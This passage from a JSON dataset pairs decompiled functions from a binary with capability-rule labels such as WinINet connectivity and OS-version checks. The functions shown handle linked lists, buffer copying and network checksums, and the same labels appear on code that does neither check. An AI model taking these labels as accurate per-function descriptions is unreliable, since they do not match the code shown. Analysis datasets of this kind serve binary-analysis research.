        "decompiled_code": "\nvoid fcn.0003f3b0(ulong arg1, ulong noname_1, ulong arg3)\n\n{\n    ushort uVar1;\n    ulong *puVar2;\n    ushort in_R9W;\n    uchar auStack56 [16];\n    \n    if (*0x80330 != 0) {\n        puVar2 = fcn.00030cc4(0x110);\n        if (puVar2 != NULL) {\n            fcn.0006670a(puVar2 + 1, arg1, 0x80);\n            fcn.0006670a(puVar2 + 0x11, arg3);\n            uVar1 = fcn.00030df4(noname_1);\n            *(puVar2 + 0x21) = uVar1;\n            uVar1 = fcn.00030df4(in_R9W);\n            *(puVar2 + 0x10a) = uVar1;\n            fcn.00032650(0x80338, auStack56, 1);\n            *puVar2 = *0x80350;\n            *0x80350 = puVar2;\n            fcn.00032684(0x80338, auStack56, 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 278
    },
    "0003f47c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0003f47c(ulong arg1, ulong noname_1, ulong arg3)\n\n{\n    ulong *puVar1;\n    int32_t iVar2;\n    ulong *puVar3;\n    ulong *puVar4;\n    int16_t in_R9W;\n    uchar auStack72 [24];\n    \n    if (*0x80330 != 0) {\n        fcn.00032650(0x80338, auStack72, 1);\n        puVar1 = *0x80350;\n        puVar4 = NULL;\n        while (puVar3 = puVar1,  puVar3 != NULL) {\n            iVar2 = fcn.0006674c(puVar3 + 1, arg1, 0x80, 8, 8);\n            puVar1 = *0x80350;\n            if ((((iVar2 == 0) && (*(puVar3 + 0x21) == noname_1)) &&\n                (iVar2 = fcn.0006674c(puVar3 + 0x11, arg3, 0x80, 8, 8),  puVar1 = *0x80350,  iVar2 == 0)) &&\n               ((*(puVar3 + 0x10a) == in_R9W && (puVar1 = *puVar3,  puVar4 != NULL)))) {\n                *puVar4 = *puVar3;\n                puVar1 = *0x80350;\n            }\n            *0x80350 = puVar1;\n            puVar4 = puVar3;\n            puVar1 = *puVar3;\n        }\n        fcn.00032684(0x80338, auStack72, 1);\n        fcn.00030d24(0);\n    }\n    return;\n}\n",
        "token_count": 397
    },
    "0003f798": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0003f798(void)\n\n{\n    if (*0x80378 == 0) {\n        *0x80370 = 0;\n        fcn.000324cc(0x80358);\n        *0x80378 = 1;\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "0003f7cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0003f7cc(void)\n\n{\n    ulong *puVar1;\n    ulong *puVar2;\n    ulong *arg1;\n    uchar auStackX8 [8];\n    ulong uStackX16;\n    \n    if (*0x80378 == 0) {\n        return;\n    }\n    *0x80378 = 0;\n    fcn.00032650(0x80358, auStackX8, 0);\n    for (puVar2 = *0x80370; puVar2 != NULL; puVar2 = *puVar2) {\n        *(puVar2 + 0x10b) = 1;\n        (*_fcn.00011638)(puVar2 + 0x108, 0);\n    }\n    fcn.00032684(0x80358, auStackX8, 0);\n    do {\n        fcn.00032650(0x80358, auStackX8, 1);\n        puVar2 = NULL;\n        for (arg1 = *0x80370; puVar1 = *0x80370,  arg1 != NULL; arg1 = *arg1) {\n            if (*(arg1 + 0x7f4) == 0) {\n                puVar1 = *arg1;\n                if (puVar2 != NULL) {\n                    *puVar2 = *arg1;\n                    puVar1 = *0x80370;\n                }\n                break;\n            }\n            puVar2 = arg1;\n        }\n        *0x80370 = puVar1;\n        fcn.00032684(0x80358, auStackX8, 1);\n        if (arg1 == NULL) {\n            while( true ) {\n                fcn.00032650(0x80358, auStackX8, 0);\n                if (*0x80370 == NULL) break;\n                fcn.00032684(0x80358, auStackX8, 0);\n                uStackX16 = 0xfffffffffff0bdc0;\n                (**0x115e8)(0, 0);\n            }\n            fcn.00032684(0x80358, auStackX8, 0);\n            fcn.000326c0(0x80358);\n            return;\n        }\n        fcn.00032650(arg1 + 0x101, auStackX8, 1);\n        puVar2 = arg1[0x107];\n        while (puVar2 != NULL) {\n            puVar1 = *puVar2;\n            fcn.00030d24(puVar2[3]);\n            fcn.00030d24(puVar2);\n            puVar2 = puVar1;\n        }\n        fcn.00032684(arg1 + 0x101, auStackX8, 1);\n        fcn.000326c0(arg1 + 0x101);\n        fcn.00030d24(arg1);\n    } while( true );\n}\n",
        "token_count": 651
    },
    "0003f968": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong * fcn.0003f968(ulong arg1, ulong noname_1, ulong arg3)\n\n{\n    ulong *puVar1;\n    ushort in_R9W;\n    ulong in_stack_00000028;\n    ushort in_stack_00000030;\n    uchar auStack56 [16];\n    \n    if ((*0x80378 != 0) && (puVar1 = fcn.00030cc4(0x880),  puVar1 != NULL)) {\n        fcn.0006677c(puVar1, 0, 0x880);\n        fcn.0006670a(puVar1 + 0xda, arg1, 0x80);\n        *(puVar1 + 0xea) = noname_1;\n        fcn.0006670a(puVar1 + 0xeb, arg3);\n        *(puVar1 + 0x7da) = in_stack_00000030;\n        *(puVar1 + 0xfb) = in_R9W;\n        puVar1[0x100] = in_stack_00000028;\n        *(puVar1 + 0xfe) = 0;\n        fcn.000324cc(puVar1 + 0x101);\n        (*_fcn.00011608)(puVar1 + 0x104, 1);\n        (*_fcn.00011608)(puVar1 + 0x108, 1);\n        fcn.00032650(0x80358, auStack56, 1);\n        *puVar1 = *0x80370;\n        *0x80370 = puVar1;\n        fcn.00032684(0x80358, auStack56, 1);\n        return puVar1;\n    }\n    return NULL;\n}\n",
        "token_count": 388
    },
    "000400b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000400b4(int64_t arg1, int64_t arg2, uint64_t arg3, uint64_t *arg4)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    ulong uVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    ulong *puVar8;\n    ulong *arg1_00;\n    int64_t arg1_01;\n    ulong *puStackX8;\n    int64_t iStackX16;\n    int64_t iStackX32;\n    int32_t in_stack_00000028;\n    uint32_t in_stack_ffffffffffffff58;\n    uint32_t uVar9;\n    uint64_t in_stack_ffffffffffffff60;\n    uchar auStack104 [8];\n    int64_t iStack96;\n    int64_t iStack88;\n    \n    *arg4 = 0;\n    if (*(arg1 + 0x858) != 0) {\n        return 0xc0000001;\n    }\n    uVar7 = in_stack_ffffffffffffff60 >> 8;\n    uVar9 = in_stack_ffffffffffffff58 >> 8;\n    iStackX16 = arg2;\n    while( true ) {\n        uVar7 = uVar7 << 8;\n        uVar9 = uVar9 << 8;\n        iStackX32 = in_stack_00000028 * -10000;\n        iStack96 = arg1 + 0x820;\n        iStack88 = arg1 + 0x840;\n        uVar5 = (**0x114c0)(2, &iStack96, 1, 0, uVar9, uVar7, &iStackX32, 0);\n        if (uVar5 == 1) {\n            return uVar5;\n        }\n        if (uVar5 == 0x102) {\n            return uVar5;\n        }\n        fcn.00032650(arg1 + 0x808, auStack104, 1);\n        if (*(arg1 + 0x838) != 0) break;\n        fcn.00032684(arg1 + 0x808, auStack104, 1);\n        uVar7 = uVar7 >> 8;\n        uVar9 = uVar9 >> 8;\n    }\n    uVar7 = 0;\n    arg1_00 = *(arg1 + 0x838);\n    for (puVar8 = arg1_00; puVar8 != NULL; puVar8 = *puVar8) {\n        uVar7 = uVar7 + puVar8[2];\n        if (arg3 <= uVar7) {\n            if (uVar7 == arg3) {\n                *(arg1 + 0x838) = *puVar8;\n                *puVar8 = 0;\n            }\n            else {\n                arg1_01 = uVar7 - arg3;\n                puStackX8 = fcn.00030cc4(0x20);\n                iVar6 = fcn.00030cc4(arg1_01);\n                arg2 = iStackX16;\n                if ((puStackX8 != NULL) && (iVar6 != 0)) {\n                    fcn.0006677c(puStackX8, 0, 0x20);\n                    fcn.0006670a(iVar6, (puVar8[3] - arg1_01) + puVar8[2], arg1_01);\n                    puStackX8[3] = iVar6;\n                    puStackX8[2] = arg1_01;\n                    *(arg1 + 0x838) = puStackX8;\n                    *puStackX8 = *puVar8;\n                    puVar8[2] = puVar8[2] - arg1_01;\n                    *puVar8 = 0;\n                    arg2 = iStackX16;\n                }\n            }\n            goto code_r0x00040294;\n        }\n    }\n    *(arg1 + 0x838) = 0;\ncode_r0x00040294:\n    if (*(arg1 + 0x838) != 0) {\n        (*_fcn.00011638)(arg1 + 0x820, 0, 0);\n    }\n    fcn.00032684(arg1 + 0x808, auStack104, 1);\n    if (arg1_00 != NULL) {\n        if (arg3 < uVar7) {\n            uVar7 = arg3;\n        }\n        *arg4 = uVar7;\n        puVar8 = arg1_00;\n        uVar7 = 0;\n        do {\n            if (*arg4 <= uVar7) break;\n            fcn.0006670a(uVar7 + arg2, puVar8[3], puVar8[2]);\n            uVar7 = uVar7 + puVar8[2];\n            puVar8 = *puVar8;\n        } while (puVar8 != NULL);\n        do {\n            puVar8 = *arg1_00;\n            fcn.00030d24(arg1_00[3]);\n            fcn.00030d24(arg1_00);\n            arg1_00 = puVar8;\n        } while (puVar8 != NULL);\n        iVar1 = *(arg1 + 0x6d0);\n        uVar2 = *(arg1 + 0x7fc);\n        uVar3 = *(arg1 + 0x800);\n        uVar7 = 0;\n        puStackX8 = NULL;\n        iVar4 = (**0x7fff8)(*0x80308, 0, 0, 0, 0, 0, &puStackX8);\n        if (iVar4 == 0) {\n            (**0x7ffe8)(*0x80300, 0, 0, uVar3, uVar2, uVar7 & 0xffffffffffff0000 | (-(iVar1 == 0x17) & 2) + 0x14, \n                        0x10000, puStackX8, 0, 0x3f744, 0);\n            puStackX8 = NULL;\n        }\n        if (puStackX8 != NULL) {\n            (**0x7fff0)();\n        }\n        iVar1 = *(arg1 + 0x6d0);\n        uVar2 = *(arg1 + 0x7fc);\n        uVar3 = *(arg1 + 0x800);\n        uVar7 = 0;\n        puStackX8 = NULL;\n        iVar4 = (**0x7fff8)(*0x80308, 0, 0, 0, 0, 0, &puStackX8);\n        if (iVar4 == 0) {\n            iVar4 = (**0x7ffe8)(*0x80300, 0, 0, uVar3, uVar2, uVar7 & 0xffffffffffff0000 | (-(iVar1 == 0x17) & 2) + 0x14\n                                , 3, puStackX8, 0, 0x3f744, 0);\n            puStackX8 = -(iVar4 != 0) & puStackX8;\n        }\n        if (puStackX8 != NULL) {\n            (**0x7fff0)();\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1626
    },
    "000404f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000404f8(int64_t arg1)\n\n{\n    int64_t iVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    int16_t *arg1_00;\n    int16_t *arg3;\n    int64_t iVar6;\n    int64_t iVar7;\n    \n    arg1_00 = *(arg1 + 0x28);\n    iVar1 = *(arg1 + 0x68);\n    iVar6 = *(arg1 + 0x48);\n    iVar7 = *(arg1 + 0x58);\n    uVar5 = 0;\n    arg3 = arg1_00 + 0xe;\n    if (iVar1 != 0) {\n        do {\n            if (*arg1_00 == 0x17) {\n                fcn.00030df4();\n                uVar2 = fcn.00030df4(arg1_00[1]);\n                uVar3 = fcn.0003f678(arg1_00, uVar2, arg3);\n            }\n            else {\n                fcn.00030df4();\n                uVar2 = fcn.00030df4();\n                uVar3 = fcn.0003f5e8(*(arg1_00 + 2), uVar2, *(arg3 + 2));\n            }\n            uVar4 = fcn.000353f0();\n            if ((uVar4 | uVar3) == 0) {\n                arg1_00 = arg1_00 + *(arg1 + 0x30);\n                arg3 = arg3 + *(arg1 + 0x30);\n                iVar6 = iVar6 + *(arg1 + 0x50);\n                iVar7 = iVar7 + *(arg1 + 0x60);\n                uVar5 = uVar5 + 1;\n            }\n            else {\n                if (*(arg1 + 0x48) != 0) {\n                    fcn.0006670a(iVar6, *(arg1 + 0x50) + iVar6, ((*(arg1 + 0x68) - uVar5) + -1) * *(arg1 + 0x50));\n                }\n                if (*(arg1 + 0x58) != 0) {\n                    fcn.0006670a(iVar7, *(arg1 + 0x60) + iVar7, ((*(arg1 + 0x68) - uVar5) + -1) * *(arg1 + 0x60));\n                }\n                fcn.0006670a();\n                *(arg1 + 0x68) = *(arg1 + 0x68) + -1;\n            }\n        } while (uVar5 < *(arg1 + 0x68));\n    }\n    fcn.0006677c(*(arg1 + 0x30) * *(arg1 + 0x68) + *(arg1 + 0x28), 0, (iVar1 - *(arg1 + 0x68)) * *(arg1 + 0x30));\n    fcn.0006677c(*(arg1 + 0x50) * *(arg1 + 0x68) + *(arg1 + 0x48), 0, (iVar1 - *(arg1 + 0x68)) * *(arg1 + 0x50));\n    // WARNING: Could not recover jumptable at 0x0006677c. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x11188)(*(arg1 + 0x60) * *(arg1 + 0x68) + *(arg1 + 0x58), 0, (iVar1 - *(arg1 + 0x68)) * *(arg1 + 0x60));\n    return;\n}\n",
        "token_count": 843
    },
    "00040bc8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00040bc8(uint16_t *arg1, uint16_t *arg2, ulong arg3)\n\n{\n    uint16_t *puVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint16_t *puVar4;\n    uint16_t *puVar5;\n    uint16_t *puVar6;\n    uint16_t *puVar7;\n    uint16_t *puVar8;\n    uint16_t *puVar9;\n    uint16_t *puVar10;\n    uint16_t *puVar11;\n    uint16_t *puVar12;\n    uint16_t *puVar13;\n    uint16_t *puVar14;\n    uint16_t *puVar15;\n    uint16_t uVar16;\n    uint32_t uVar17;\n    uint16_t *puVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint64_t uVar21;\n    \n    uVar19 = arg3 - 0x14;\n    puVar18 = arg2 + 10;\n    uVar20 = arg1[5] + arg1[4] + arg1[3] + arg1[2] + arg2[9] + arg1[1] + arg2[8] + arg2[7] + arg2[6] + arg2[5] + arg2[4]\n             + arg2[3] + arg2[2] + arg2[1] + *arg1 + *arg2;\n    if (0x1f < uVar19) {\n        uVar21 = uVar19 >> 5;\n        uVar19 = uVar19 + (uVar19 >> 5) * -0x20;\n        do {\n            puVar1 = puVar18 + 0xe;\n            puVar2 = puVar18 + 0xf;\n            puVar3 = puVar18 + 0xd;\n            puVar4 = puVar18 + 0xc;\n            puVar5 = puVar18 + 0xb;\n            puVar6 = puVar18 + 10;\n            puVar7 = puVar18 + 9;\n            puVar8 = puVar18 + 8;\n            puVar9 = puVar18 + 7;\n            puVar10 = puVar18 + 6;\n            puVar11 = puVar18 + 5;\n            puVar12 = puVar18 + 4;\n            puVar13 = puVar18 + 3;\n            puVar14 = puVar18 + 2;\n            puVar15 = puVar18 + 1;\n            uVar16 = *puVar18;\n            puVar18 = puVar18 + 0x10;\n            uVar20 = uVar20 + uVar16 +\n                     *puVar2 + *puVar1 + *puVar3 + *puVar4 + *puVar5 + *puVar6 + *puVar7 + *puVar8 + *puVar9 + *puVar10\n                     + *puVar11 + *puVar12 + *puVar13 + *puVar14 + *puVar15;\n            uVar21 = uVar21 - 1;\n        } while (uVar21 != 0);\n    }\n    if (7 < uVar19) {\n        uVar21 = uVar19 >> 3;\n        uVar19 = uVar19 + (uVar19 >> 3) * -8;\n        do {\n            puVar1 = puVar18 + 2;\n            puVar2 = puVar18 + 3;\n            puVar3 = puVar18 + 1;\n            uVar16 = *puVar18;\n            puVar18 = puVar18 + 4;\n            uVar20 = uVar20 + uVar16 + *puVar2 + *puVar1 + *puVar3;\n            uVar21 = uVar21 - 1;\n        } while (uVar21 != 0);\n    }\n    if (1 < uVar19) {\n        uVar17 = (uVar19 - 2 >> 1) + 1;\n        uVar21 = uVar17;\n        uVar19 = uVar19 + uVar17 * -2;\n        do {\n            uVar16 = *puVar18;\n            puVar18 = puVar18 + 1;\n            uVar20 = uVar20 + uVar16;\n            uVar21 = uVar21 - 1;\n        } while (uVar21 != 0);\n    }\n    if (uVar19 == 1) {\n        uVar20 = uVar20 + *puVar18;\n    }\n    uVar19 = (uVar20 >> 0x10) + (uVar20 & 0xffff);\n    return ~((uVar19 >> 0x10) + uVar19);\n}\n",
        "token_count": 1059
    },
    "00040d50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00040d50(uint16_t *arg1, uint16_t *arg2, ulong arg3)\n\n{\n    uint16_t *puVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint16_t *puVar4;\n    uint16_t *puVar5;\n    uint16_t *puVar6;\n    uint16_t *puVar7;\n    uint16_t *puVar8;\n    uint16_t *puVar9;\n    uint16_t *puVar10;\n    uint16_t *puVar11;\n    uint16_t *puVar12;\n    uint16_t *puVar13;\n    uint16_t *puVar14;\n    uint16_t *puVar15;\n    uint16_t uVar16;\n    uint32_t uVar17;\n    uint16_t *puVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint64_t uVar21;\n    \n    uVar19 = arg3 - 0x14;\n    puVar18 = arg2 + 10;\n    uVar20 = arg1[0x11] + arg1[0x10] + arg1[0xf] + arg1[0xe] + arg1[0xd] + arg1[0xc] + arg1[0xb] + arg1[10] + arg1[9] +\n             arg1[8] + arg1[7] + arg1[6] + arg1[5] + arg1[4] + arg1[3] + arg1[2] + arg2[9] + arg1[1] + arg2[8] + arg2[7]\n             + arg2[6] + arg2[5] + arg2[4] + arg2[3] + arg2[2] + arg2[1] + *arg1 + *arg2;\n    if (0x1f < uVar19) {\n        uVar21 = uVar19 >> 5;\n        uVar19 = uVar19 + (uVar19 >> 5) * -0x20;\n        do {\n            puVar1 = puVar18 + 0xe;\n            puVar2 = puVar18 + 0xf;\n            puVar3 = puVar18 + 0xd;\n            puVar4 = puVar18 + 0xc;\n            puVar5 = puVar18 + 0xb;\n            puVar6 = puVar18 + 10;\n            puVar7 = puVar18 + 9;\n            puVar8 = puVar18 + 8;\n            puVar9 = puVar18 + 7;\n            puVar10 = puVar18 + 6;\n            puVar11 = puVar18 + 5;\n            puVar12 = puVar18 + 4;\n            puVar13 = puVar18 + 3;\n            puVar14 = puVar18 + 2;\n            puVar15 = puVar18 + 1;\n            uVar16 = *puVar18;\n            puVar18 = puVar18 + 0x10;\n            uVar20 = uVar20 + uVar16 +\n                     *puVar2 + *puVar1 + *puVar3 + *puVar4 + *puVar5 + *puVar6 + *puVar7 + *puVar8 + *puVar9 + *puVar10\n                     + *puVar11 + *puVar12 + *puVar13 + *puVar14 + *puVar15;\n            uVar21 = uVar21 - 1;\n        } while (uVar21 != 0);\n    }\n    if (7 < uVar19) {\n        uVar21 = uVar19 >> 3;\n        uVar19 = uVar19 + (uVar19 >> 3) * -8;\n        do {\n            puVar1 = puVar18 + 2;\n            puVar2 = puVar18 + 3;\n            puVar3 = puVar18 + 1;\n            uVar16 = *puVar18;\n            puVar18 = puVar18 + 4;\n            uVar20 = uVar20 + uVar16 + *puVar2 + *puVar1 + *puVar3;\n            uVar21 = uVar21 - 1;\n        } while (uVar21 != 0);\n    }\n    if (1 < uVar19) {\n        uVar17 = (uVar19 - 2 >> 1) + 1;\n        uVar21 = uVar17;\n        uVar19 = uVar19 + uVar17 * -2;\n        do {\n            uVar16 = *puVar18;\n            puVar18 = puVar18 + 1;\n            uVar20 = uVar20 + uVar16;\n            uVar21 = uVar21 - 1;\n        } while (uVar21 != 0);\n    }\n    if (uVar19 == 1) {\n        uVar20 = uVar20 + *puVar18;\n    }\n    uVar19 = (uVar20 >> 0x10) + (uVar20 & 0xffff);\n    return ~((uVar19 >> 0x10) + uVar19);\n}\n",
        "token_count": 1141
    },
    "00040f2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00040f2c(uint16_t *arg1, uint16_t *arg2, ulong arg3)\n\n{\n    uint16_t *puVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint16_t *puVar4;\n    uint16_t *puVar5;\n    uint16_t *puVar6;\n    uint16_t *puVar7;\n    uint16_t *puVar8;\n    uint16_t *puVar9;\n    uint16_t *puVar10;\n    uint16_t *puVar11;\n    uint16_t *puVar12;\n    uint16_t *puVar13;\n    uint16_t *puVar14;\n    uint16_t *puVar15;\n    uint16_t uVar16;\n    uint32_t uVar17;\n    uint16_t *puVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint64_t uVar21;\n    \n    uVar19 = arg3 - 8;\n    puVar18 = arg2 + 4;\n    uVar20 = arg1[0x11] + arg1[0x10] + arg1[0xf] + arg1[0xe] + arg1[0xd] + arg1[0xc] + arg1[0xb] + arg1[10] + arg1[9] +\n             arg1[8] + arg1[7] + arg1[6] + arg1[5] + arg1[4] + arg1[3] + arg1[2] + arg1[1] + arg2[3] + arg2[2] + arg2[1]\n             + *arg1 + *arg2;\n    if (0x1f < uVar19) {\n        uVar21 = uVar19 >> 5;\n        uVar19 = uVar19 + (uVar19 >> 5) * -0x20;\n        do {\n            puVar1 = puVar18 + 0xe;\n            puVar2 = puVar18 + 0xf;\n            puVar3 = puVar18 + 0xd;\n            puVar4 = puVar18 + 0xc;\n            puVar5 = puVar18 + 0xb;\n            puVar6 = puVar18 + 10;\n            puVar7 = puVar18 + 9;\n            puVar8 = puVar18 + 8;\n            puVar9 = puVar18 + 7;\n            puVar10 = puVar18 + 6;\n            puVar11 = puVar18 + 5;\n            puVar12 = puVar18 + 4;\n            puVar13 = puVar18 + 3;\n            puVar14 = puVar18 + 2;\n            puVar15 = puVar18 + 1;\n            uVar16 = *puVar18;\n            puVar18 = puVar18 + 0x10;\n            uVar20 = uVar20 + uVar16 +\n                     *puVar2 + *puVar1 + *puVar3 + *puVar4 + *puVar5 + *puVar6 + *puVar7 + *puVar8 + *puVar9 + *puVar10\n                     + *puVar11 + *puVar12 + *puVar13 + *puVar14 + *puVar15;\n            uVar21 = uVar21 - 1;\n        } while (uVar21 != 0);\n    }\n    if (7 < uVar19) {\n        uVar21 = uVar19 >> 3;\n        uVar19 = uVar19 + (uVar19 >> 3) * -8;\n        do {\n            puVar1 = puVar18 + 2;\n            puVar2 = puVar18 + 3;\n            puVar3 = puVar18 + 1;\n            uVar16 = *puVar18;\n            puVar18 = puVar18 + 4;\n            uVar20 = uVar20 + uVar16 + *puVar2 + *puVar1 + *puVar3;\n            uVar21 = uVar21 - 1;\n        } while (uVar21 != 0);\n    }\n    if (1 < uVar19) {\n        uVar17 = (uVar19 - 2 >> 1) + 1;\n        uVar21 = uVar17;\n        uVar19 = uVar19 + uVar17 * -2;\n        do {\n            uVar16 = *puVar18;\n            puVar18 = puVar18 + 1;\n            uVar20 = uVar20 + uVar16;\n            uVar21 = uVar21 - 1;\n        } while (uVar21 != 0);\n    }\n    if (uVar19 == 1) {\n        uVar20 = uVar20 + *puVar18;\n    }\n    uVar19 = (uVar20 >> 0x10) + (uVar20 & 0xffff);\n    return ~((uVar19 >> 0x10) + uVar19);\n}\n",
        "token_count": 1104
    },
    "000410e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.000410e0(uint16_t *arg1, uint16_t *arg2, ulong arg3)\n\n{\n    uint16_t *puVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint16_t *puVar4;\n    uint16_t *puVar5;\n    uint16_t *puVar6;\n    uint16_t *puVar7;\n    uint16_t *puVar8;\n    uint16_t *puVar9;\n    uint16_t *puVar10;\n    uint16_t *puVar11;\n    uint16_t *puVar12;\n    uint16_t *puVar13;\n    uint16_t *puVar14;\n    uint16_t *puVar15;\n    uint16_t uVar16;\n    uint32_t uVar17;\n    uint16_t *puVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint64_t uVar21;\n    \n    uVar19 = arg3 - 8;\n    puVar18 = arg2 + 4;\n    uVar20 = arg1[5] + arg1[4] + arg1[3] + arg1[2] + arg1[1] + arg2[3] + arg2[2] + arg2[1] + *arg1 + *arg2;\n    if (0x1f < uVar19) {\n        uVar21 = uVar19 >> 5;\n        uVar19 = uVar19 + (uVar19 >> 5) * -0x20;\n        do {\n            puVar1 = puVar18 + 0xe;\n            puVar2 = puVar18 + 0xf;\n            puVar3 = puVar18 + 0xd;\n            puVar4 = puVar18 + 0xc;\n            puVar5 = puVar18 + 0xb;\n            puVar6 = puVar18 + 10;\n            puVar7 = puVar18 + 9;\n            puVar8 = puVar18 + 8;\n            puVar9 = puVar18 + 7;\n            puVar10 = puVar18 + 6;\n            puVar11 = puVar18 + 5;\n            puVar12 = puVar18 + 4;\n            puVar13 = puVar18 + 3;\n            puVar14 = puVar18 + 2;\n            puVar15 = puVar18 + 1;\n            uVar16 = *puVar18;\n            puVar18 = puVar18 + 0x10;\n            uVar20 = uVar20 + uVar16 +\n                     *puVar2 + *puVar1 + *puVar3 + *puVar4 + *puVar5 + *puVar6 + *puVar7 + *puVar8 + *puVar9 + *puVar10\n                     + *puVar11 + *puVar12 + *puVar13 + *puVar14 + *puVar15;\n            uVar21 = uVar21 - 1;\n        } while (uVar21 != 0);\n    }\n    if (7 < uVar19) {\n        uVar21 = uVar19 >> 3;\n        uVar19 = uVar19 + (uVar19 >> 3) * -8;\n        do {\n            puVar1 = puVar18 + 2;\n            puVar2 = puVar18 + 3;\n            puVar3 = puVar18 + 1;\n            uVar16 = *puVar18;\n            puVar18 = puVar18 + 4;\n            uVar20 = uVar20 + uVar16 + *puVar2 + *puVar1 + *puVar3;\n            uVar21 = uVar21 - 1;\n        } while (uVar21 != 0);\n    }\n    if (1 < uVar19) {\n        uVar17 = (uVar19 - 2 >> 1) + 1;\n        uVar21 = uVar17;\n        uVar19 = uVar19 + uVar17 * -2;\n        do {\n            uVar16 = *puVar18;\n            puVar18 = puVar18 + 1;\n            uVar20 = uVar20 + uVar16;\n            uVar21 = uVar21 - 1;\n        } while (uVar21 != 0);\n    }\n    if (uVar19 == 1) {\n        uVar20 = uVar20 + *puVar18;\n    }\n    uVar19 = (uVar20 >> 0x10) + (uVar20 & 0xffff);\n    return ~((uVar19 >> 0x10) + uVar19);\n}\n",
        "token_count": 1020
    },
    "00041240": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00041240(uint16_t *arg1, ulong arg2)\n\n{\n    uint16_t *puVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint16_t *puVar4;\n    uint16_t *puVar5;\n    uint16_t *puVar6;\n    uint16_t *puVar7;\n    uint16_t *puVar8;\n    uint16_t *puVar9;\n    uint16_t *puVar10;\n    uint16_t *puVar11;\n    uint16_t *puVar12;\n    uint16_t *puVar13;\n    uint16_t *puVar14;\n    uint16_t *puVar15;\n    uint16_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint64_t uVar19;\n    \n    uVar18 = 0;\n    if (0x1f < arg2) {\n        uVar19 = arg2 >> 5;\n        arg2._0_4_ = arg2 + (arg2 >> 5) * -0x20;\n        do {\n            puVar1 = arg1 + 0xe;\n            puVar2 = arg1 + 0xf;\n            puVar3 = arg1 + 0xd;\n            puVar4 = arg1 + 0xc;\n            puVar5 = arg1 + 0xb;\n            puVar6 = arg1 + 10;\n            puVar7 = arg1 + 9;\n            puVar8 = arg1 + 8;\n            puVar9 = arg1 + 7;\n            puVar10 = arg1 + 6;\n            puVar11 = arg1 + 5;\n            puVar12 = arg1 + 4;\n            puVar13 = arg1 + 3;\n            puVar14 = arg1 + 2;\n            puVar15 = arg1 + 1;\n            uVar16 = *arg1;\n            arg1 = arg1 + 0x10;\n            uVar18 = uVar18 + uVar16 +\n                     *puVar2 + *puVar1 + *puVar3 + *puVar4 + *puVar5 + *puVar6 + *puVar7 + 